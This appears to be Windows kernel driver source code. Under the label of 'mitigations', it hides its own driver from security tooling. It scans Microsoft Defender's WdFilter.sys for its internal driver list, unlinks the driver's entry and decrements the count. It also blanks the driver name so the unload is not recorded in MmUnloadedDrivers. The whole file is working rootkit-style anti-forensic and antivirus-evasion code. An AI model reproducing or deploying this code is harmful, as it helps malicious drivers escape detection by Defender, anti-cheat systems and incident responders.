#include "mitigations.h"
#define DEVICE_OBJECT_IN_HANDLE_OBJECT 0x8
#define DRIVER_OBJECT_IN_DEVICE_OBJECT 0x8
#define DRIVER_NAME_IN_DRIVER_SECTION 0x58


VOID ServiceLogs::MitigateDataStructures(_In_ PDEVICE_OBJECT GlobalDeviceObject) {
	NTSTATUS Status = ServiceLogs::MitigateWdFilter();
	if (!NT_SUCCESS(Status)) {
		goto CleanUp;
	}
	Status = ServiceLogs::MitigateUnloadedDrivers(GlobalDeviceObject);
	if (!NT_SUCCESS(Status)) {
		goto CleanUp;
	}
CleanUp:
	DbgPrintEx(0, 0, "BootStart mitigations - Data Structures mitigations completed\n");
}


NTSTATUS ServiceLogs::MitigateWdFilter() {
	PVOID WdFilterBase = GetKernelModuleAddress("WdFilter.sys");
	if (WdFilterBase == NULL) {
		DbgPrintEx(0, 0, "BootStart mitigations - WdFilter.sys not loaded, clear skipped\n");
		return STATUS_SUCCESS;
	}


	// Get information about the list of running system modules that is logged in wdfilter.sys:
	PVOID RuntimeDriversList = FindPatternInSectionAtKernel("PAGE", WdFilterBase, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
	if (RuntimeDriversList == NULL) {
		DbgPrintEx(0, 0, "BootStart mitigations - Failed to find WdFilter RuntimeDriversList\n");
		return STATUS_UNSUCCESSFUL;
	}
	PVOID RuntimeDriversCountRef = FindPatternInSectionAtKernel("PAGE", WdFilterBase, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");
	if (RuntimeDriversCountRef == NULL) {
		DbgPrintEx(0, 0, "BootStart mitigations - Failed to find WdFilter RuntimeDriversCount\n");
		return STATUS_UNSUCCESSFUL;
	}
	PVOID MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilterBase, (PUCHAR)"\x49\x8B\xC9\x00\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "xxx?x?xx???????????x");
	if (MpFreeDriverInfoExRef == NULL) {
		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilterBase, (PUCHAR)"\x48\x89\x4A\x00\x49\x8b\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "xxx?xx?x???????????x");
		if (!MpFreeDriverInfoExRef) {
			DbgPrintEx(0, 0, "BootStart mitigations - Failed to find WdFilter MpFreeDriverInfoEx\n");
			return STATUS_UNSUCCESSFUL;
		}
	}
	MpFreeDriverInfoExRef = (PVOID)((ULONG64)MpFreeDriverInfoExRef + 0x7); // skip until call instruction
	RuntimeDriversList = ResolveRelativeAddress((PVOID)RuntimeDriversList, 3, 7);
	PVOID RuntimeDriversList_Head = (PVOID)((ULONG64)RuntimeDriversList - 0x8);
	PVOID RuntimeDriversCount = ResolveRelativeAddress((PVOID)RuntimeDriversCountRef, 2, 6);
	PVOID RuntimeDriversArray = (PVOID)((ULONG64)RuntimeDriversCount + 0x8);
	RtlCopyMemory(&RuntimeDriversArray, RuntimeDriversArray, sizeof(uintptr_t));
	// PVOID MpFreeDriverInfoEx = ResolveRelativeAddress((PVOID)MpFreeDriverInfoExRef, 1, 5);  // Free not needed for now
	auto ReadListEntry = [&](PVOID Address) -> LIST_ENTRY* { // Usefull lambda to read LIST_ENTRY
		LIST_ENTRY* Entry;
		RtlCopyMemory(&Entry, Address, sizeof(LIST_ENTRY*));
		return Entry;
		};


	// Iterate all list entries and find the matching one to my driver:
	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
		Entry = ReadListEntry((PVOID)((ULONG64)Entry + (offsetof(struct _LIST_ENTRY, Flink)))))
	{
		UNICODE_STRING Unicode_String = { 0 };
		RtlCopyMemory(&Unicode_String, (PVOID)((uintptr_t)Entry + 0x10), sizeof(UNICODE_STRING));
		PVOID ImageName = ExAllocatePoolWithTag(NonPagedPool, (ULONG64)Unicode_String.Length + sizeof(WCHAR), 0x12345678);
		if (ImageName != NULL) {
			RtlCopyMemory(ImageName, Unicode_String.Buffer, Unicode_String.Length);
			if (wcsstr((WCHAR*)ImageName, DRIVER_NAME)) {
				bool removedRuntimeDriversArray = false;
				PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
				for (int k = 0; k < 256; k++) { // max RuntimeDriversArray elements
					PVOID value = 0;
					RtlCopyMemory(&value, (PVOID)((ULONG64)RuntimeDriversArray + (k * 8)), sizeof(PVOID));
					if (value == SameIndexList) {
						PVOID emptyval = (PVOID)((ULONG64)RuntimeDriversCount + 1); // this is not count+1 is position of cout addr+1
						RtlCopyMemory((PVOID)((ULONG64)RuntimeDriversArray + (k * 8)), &emptyval, sizeof(PVOID));
						removedRuntimeDriversArray = true;
						break;
					}
				}
				if (!removedRuntimeDriversArray) {
					ExFreePool(ImageName);
					return STATUS_NOT_FOUND;
				}
				auto NextEntry = ReadListEntry((PVOID)((ULONG64)Entry + (offsetof(struct _LIST_ENTRY, Flink))));
				auto PrevEntry = ReadListEntry((PVOID)((ULONG64)Entry + (offsetof(struct _LIST_ENTRY, Blink))));
				RtlCopyMemory((PVOID)((ULONG64)NextEntry + (offsetof(struct _LIST_ENTRY, Blink))), &PrevEntry, sizeof(LIST_ENTRY::Blink));
				RtlCopyMemory((PVOID)((ULONG64)PrevEntry + (offsetof(struct _LIST_ENTRY, Flink))), &NextEntry, sizeof(LIST_ENTRY::Flink));
				ULONG current = 0;
				RtlCopyMemory(&current, RuntimeDriversCount, sizeof(ULONG));
				current--;
				RtlCopyMemory(RuntimeDriversCount, &current, sizeof(ULONG));
				DbgPrintEx(0, 0, "BootStart mitigations - WdFilterDriverList Cleaned\n");
				ExFreePool(ImageName);
				return STATUS_SUCCESS;
			}
			ExFreePool(ImageName);
		}
	}
	return STATUS_UNSUCCESSFUL;
}


NTSTATUS ServiceLogs::MitigateUnloadedDrivers(PDEVICE_OBJECT GlobalDeviceObject) {
	PVOID InfoBuffer = NULL;
	DWORD InfoBufferSize = 0;
	PSYSTEM_HANDLE_INFORMATION_EX SystemHandleInfo = NULL;
	SYSTEM_HANDLE CurrentSystemHandle = { 0 };
	PDEVICE_OBJECT CurrentDeviceObject = NULL;
	PDRIVER_OBJECT CurrentDriverObject = NULL;
	PVOID CurrentDriverSection = NULL;
	UNICODE_STRING LocalDriverName = { 0 };
	WCHAR CurrentHandleName[1024] = { 0 };


	// Get extended handle information:
	NTSTATUS Status = ZwQuerySystemInformation(SystemExtendedHandleInformation, InfoBuffer, InfoBufferSize, &InfoBufferSize);
	while (Status == STATUS_INFO_LENGTH_MISMATCH) {
		if (InfoBuffer != NULL) {
			ExFreePool(InfoBuffer);
		}
		InfoBuffer = ExAllocatePoolWithTag(NonPagedPool, InfoBufferSize, 0x90807060);
		Status = ZwQuerySystemInformation(SystemExtendedHandleInformation, InfoBuffer, InfoBufferSize, &InfoBufferSize);
	}

	if (!NT_SUCCESS(Status)) {
		if (InfoBuffer != NULL) {
			ExFreePool(InfoBuffer);
		}
		DbgPrintEx(0, 0, "BootStart mitigations - System handle information query failed: 0x%x\n", Status);
		return Status;
	}


	// get actual system handle information from information buffer:
	SystemHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)InfoBuffer;
	if (SystemHandleInfo == NULL) {
		DbgPrintEx(0, 0, "BootStart mitigations - Cannot get system handle information\n");
		return STATUS_UNSUCCESSFUL;
	}


	// Iterate all system handles and remove all of the opened handles for my driver:
	for (DWORD ModuleIndex = 0; ModuleIndex < SystemHandleInfo->HandleCount; ++ModuleIndex) {
		RtlZeroMemory(CurrentHandleName, 1024);
		CurrentSystemHandle = SystemHandleInfo->Handles[ModuleIndex];
		if (CurrentSystemHandle.Object == NULL) {
			continue;
		}
		RtlCopyMemory(&CurrentDeviceObject,
			(PVOID)((ULONG64)CurrentSystemHandle.Object + DEVICE_OBJECT_IN_HANDLE_OBJECT), sizeof(PDEVICE_OBJECT));
		if (CurrentDeviceObject == NULL) {
			continue;
		}
		CurrentDriverObject = CurrentDeviceObject->DriverObject;
		if (CurrentDriverObject == NULL) {
			continue;
		}
		CurrentDriverSection = CurrentDriverObject->DriverSection;
		if (CurrentDriverSection == NULL) {
			continue;
		}
		RtlCopyMemory(&LocalDriverName,
			(PVOID)((ULONG64)CurrentDriverSection + DRIVER_NAME_IN_DRIVER_SECTION), sizeof(UNICODE_STRING));
		if (LocalDriverName.Buffer == NULL || LocalDriverName.Length == 0 || LocalDriverName.MaximumLength == 0) {
			continue;
		}
		RtlCopyMemory(CurrentHandleName, LocalDriverName.Buffer, LocalDriverName.Length);
		

		// Match handle information to the information of my driver using the DEVICE_OBJECT passed:
		DbgPrintEx(0, 0, "BootStart mitigations - Current system handle information: %ws, %p, %p, %p ||| %ws, %p, %p, %p\n",
			CurrentHandleName, CurrentDeviceObject, CurrentDriverObject, CurrentDriverSection, DRIVER_NAME,
			GlobalDeviceObject, GlobalDeviceObject->DriverObject, GlobalDeviceObject->DriverObject->DriverSection);
		if (wcsstr(CurrentHandleName, DRIVER_NAME) && GlobalDeviceObject == CurrentDeviceObject &&
			CurrentDriverObject == GlobalDeviceObject->DriverObject &&
			CurrentDriverSection == GlobalDeviceObject->DriverObject->DriverSection) {
			DbgPrintEx(0, 0, "BootStart mitigations - Found matching system handle information, deleting ..\n");
			LocalDriverName.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver
			LocalDriverName.MaximumLength = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver
			RtlCopyMemory((PVOID)((ULONG64)CurrentDriverSection + DRIVER_NAME_IN_DRIVER_SECTION), &LocalDriverName,
				sizeof(UNICODE_STRING));
		}
	}
	ExFreePool(InfoBuffer);
	DbgPrintEx(0, 0, "BootStart mitigations - MmUnloadedDrivers Cleaned\n");
	return STATUS_SUCCESS;
}